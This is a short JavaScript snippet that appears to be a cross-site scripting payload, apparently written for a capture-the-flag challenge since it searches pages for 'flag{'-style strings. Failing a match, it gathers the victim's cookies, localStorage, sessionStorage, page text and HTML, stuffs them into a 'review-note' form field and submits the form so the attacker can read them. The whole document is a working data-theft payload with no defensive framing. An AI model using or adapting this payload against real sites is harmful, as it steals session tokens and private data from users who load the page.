(() => {
  const form = document.getElementById('review-note');
  if (!form) return;

  const html = document.documentElement.innerHTML;
  const match = html.match(/(?:firebird|flag|ctf)\{[^}]+\}/i);
  const storage = {
    local: { ...localStorage },
    session: { ...sessionStorage },
  };

  form.note.value = (match
    ? match[0]
    : [document.cookie, JSON.stringify(storage), document.body.innerText, html].join('\n')
  ).slice(0, 6000);
  form.submit();
})();
